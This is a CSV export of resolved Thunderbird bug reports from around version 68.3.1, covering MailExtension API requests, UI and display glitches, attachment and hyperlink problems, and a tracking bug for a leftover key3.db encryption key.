Issue id,Summary,Status,Priority,Resolution,Description
1606527,Command-line flag -options is broken,RESOLVED,--,DUPLICATE,[This code](https://searchfox.org/comm-central/rev/0da7f52e68483ce2f03d17fa7e7e3cdfceb193e5/mail/components/MessengerContentHandler.jsm#278) hasn't been updated for preferences-in-a-tab. The URL it tries to open is wrong (should be aboutPreferences.xhtml) but we don't want to open that in a window of its own anyway.
1606552,Attachment urls are not returned from 'browser.messages.getFull',RESOLVED,--,DUPLICATE,"I'm trying to use the `browser.messages.getFull` API to get the urls of attachments so that I can display them. When I use this API, I'm only getting the body for the main email, not the urls for the attachments. For example, the email I'm looking at at the moment has this rough structure: ``` { contentType: ""message/rfc822"", parts: [{ contentType: ""multipart/mixed"", parts: [{ contentType: ""multipart/alternative"", parts: [{ contentType: ""text/plain"", body: ""Yay, a body!"" }, { contentType: ""text/html"", body: ""<html stuff..."" }] }, { contentType: ""image.jpeg"", size: 3653748, name: ""2019.jpg"" }] }] } ``` As this doesn't have the attachment urls, there doesn't appear to be any way to get attachment data from the APIs."
1606557,tag colors don't display in list of messages,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: nothing in particular Actual results: I gave a specific message a colour (red). When is is listed in the inbox, the colour isn't there. Only when I select (click) the message, the colour is there. Expected results: The message should be red and always stay red."
1606559,Plug-in isn't working anymore since update,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: nothing in particular Actual results: Since the latest update, the plugin ""header tools lite"" doesn't work anymore. Expected results: The plugin should still work."
1606569,Hyperllinks and Attachments Don't Work,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Background: Windows 10 Build 18362.19h1_release 190318-1202 Thunderbird 68.3.1 (32-bit) -- does it need to be a 64 bit version? Firefox 74.0 (64-bit) as default browser Adobe Acrobat XI Thunderbird profile copied from old computer. Attempted to follow hyperlinks in the email and open attachments running Thunderbird in SafeMode Turned off Windows Defender Firewall Deleted the attachment associations in the Options|Attachments dialog so that T'Bird would ask me how to open the attachment Verified (using Config Editor) the hyperlink parameters were ""TRUE"" Repeated the same test with a clean install of Thunderbird with a brand new profile. Actual results: Clicking on a HyperLink in an email does nothing (whether or not in SafeMode; whether or not using the copied or a new profile) that it is would not send me to my browser. I tried using FireFox as the default browser and with Google Chrome as the default browser. Cut/Paste of the URL to the browser address window was successful. Clicking on an attachment (in this test a pdf file) does not launch the target application. The sa"
1606573,Need a persistent id for messages,RESOLVED,--,FIXED,"The current message id is not persistent across restarts. That has a few issues: * A WebExtension can't store its own additional data alongside a message (e.g. a different type of tagging or classifying mechanism). * A WebExtension can't have a tab open with the contents of a particular message in, and have it survive a restart. Since Thunderbird restores tabs, this particularly affects Thunderbird Conversations - I used to pass the uri of the message to the tab in the query parameters, and this would be restored on restart. I can't do this with the message id, as that is no longer persistent, so I'll get a random message. I'm not sure why it was felt that these need non-persistent Ids? I'm fine with the idea that they are not the existing uris, but there are valid cases I think where we need them persistent."
1606584,Change the folder enumeration MailExtension API from a flat list to a hierarchy,RESOLVED,--,FIXED,"I would like the accounts MailExtension API to preserve the tree-like structure of the folder tree for a given account, rather than require clients to jump through hoops to reconstruct that structure based on string manipulation to split paths in the folder URI. The attached patch does just that; since it only adds an extra property, I believe the breakage should be close to non-existent and I doubt that anyone relies on this yet. Thanks, Jonathan"
1606616,"In 68.3.1, I can't see any names in my address book unless I search",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Click on Address Book in menu, book opens up, it's blank, top of empty book states the following: ""Contacts from remote address books are not shown until you search. This address book shows contacts only after a search."" But in addition to no names or addresses showing, no address books are listed. Actual results: Screenshot attached. Expected results: I should be able to see multiple address books and all addresses in all books. That is how Thunderbird has always worked. An address book is made less than useful when the listings cannot be visually scanned."
1606619,key3.db encryption key remains on disk from Thunderbird 52.x (becomes issue if adding a master password post 60.x),RESOLVED,--,FIXED,"We haven't yet fixed bug 1475775 in Thunderbird. Because of the risk of key dataloss (e.g. bug 1510212), we're waiting for a solution that is more reliable than what Firefox had used as a fix. Let's use this new bug to track fixing the issue in Thunderbird. In separate NSS bug 1561368 we're working out an appropriate solution, potentially at the NSS code level."
1606621,"Thunderbirds constantly reverts to ""Archives"" folder even though I configure it to use ""Archive""",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: * sign-up for mailbox.org or fastmail account (they have archive folder under `/Archive` and not Tb `Archives`) * Change Tb configuration to use `/Archive` folder * (not sure if restart is required, I think it does) * Try to archive any message from the inbox Actual results: Thunderbird will still try to move message to `/Archives` folder - sometimes it would create that folder (mailbox.org) other times it would go bonkers (especially when archiving from subfolder with option 'keep folder structure') and move message to main archive directory. I think the most annoying thing is with mailbox.org, where it creates `/Archives` directory each time and moves messages there. I checked and settings for that mailbox still says ""Archive directory on mailbox.org"" so... something really weird is happening... Expected results: Well, Thunderbird should move messages where it's instructed to move them..."
1606670,Tiny fonts in plain text message and composition windows,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Compose a message in plain text format, or view a message received in plain text format. Actual results: As of the most recent update a few days ago (to 68.3.1), the default fonts in plain-text composition and message windows default to a tiny size. I tried Tools->Options->Display and set the plain text font size to ""larger"", but it had no effect. Expected results: The default font size should not have been changed by the update, or changing the font size under Tools->Options should have increased the font size."
1606682,Thunderbird 68.3.1/macos does not begin to run,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Click the icon of Thunderbird. Actual results: Menu bar is displayed, but everything stops there. ""Force Quit Application"" results in ""No Response"". Expected results: The menu bar will be clickable and a window will appear."
1606693,Mouse acting strange after latest updates v68.3.1 in Win7,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Steps to reproduce: Installed v68.3.1 in Win7 PC Actual results: Mouse acts stange. It opens email in new window when I select item in Inbox, instead of displaying it in pane as with v60.9.1 and previous. When deleting message from Inbox using mouse to select, it deletes the message and the FOLLOWIING message in Inbox. Expected results: Should act as before in previous versions."
1606709,Unable to open a PDF Attachment,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I tried to open the attachment to the attached message several times in repeated messages. I don't know whether to attach or forward the message either from Thundeerbird or from Outlook. If the former, how? Actual results: I received the following message: There was an error in opening this document. The file cannot be found I was able to open it in Outlook. Expected results: It should have opened. The message was originally sent to the ieee server which picked it up from hsgru@msn.com and transmitted it to hgruenberg@ieee.org hence to Thunderbird operating under Windows 10"
1606711,"If checking new mail at startup and after a time interval, a second primary/master password prompt appears when the startup prompt isn't answered",RESOLVED,--,WORKSFORME,"If checking new mail at startup and after a time interval, a second master password prompt appears when the startup prompt isn't answered. This is from bug 584014 comment #88. I reproduced this on a profile with 9 IMAP accounts, but apparently it fails with less."
1606914,different subjects are shown with one and the same email,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I did not do (nothing) but receiving my emails. Occurs in Version 68.3.1 and Build-ID 20191215232630. Actual results: With one and the same email, TWO DIFFERENT subjects are displayed! See Screenshot attached! Expected results: Of course, the subject displayed in the mails list and the open mail should be the same in both cases. ;-)"
1606926,Print Preview Screen buttons too large,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: hit ""Print Preview"" in any email message, the preview window comes up but the buttons take half the screen Link to this issue in forum here https://support.mozilla.org/en-US/questions/1276416?utm_campaign=questions-reply&utm_medium=email&utm_source=notification Actual results: The buttons above the message take up half the screen This also happens here with 72b2 32b/W10, but not with TB 68"
1606965,MailExtension: messages.update(): read flag is not saved to imap server,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Disable the ""auto mark as read"" feature: mailnews.mark_message_read.auto -> false Install https://github.com/kkapsner/mark-as-read Select a message and view it for more than 2 seconds -> it will be marked as read. Switch to another folder and back to force a refresh of the message states -> the message will be marked unread again. I also enabled the IMAP log and there was no entry to show that the flag was sent. Actual results: The read flag was not saved to the IMAP server. Expected results: The read flag should be saved to the IMAP server."
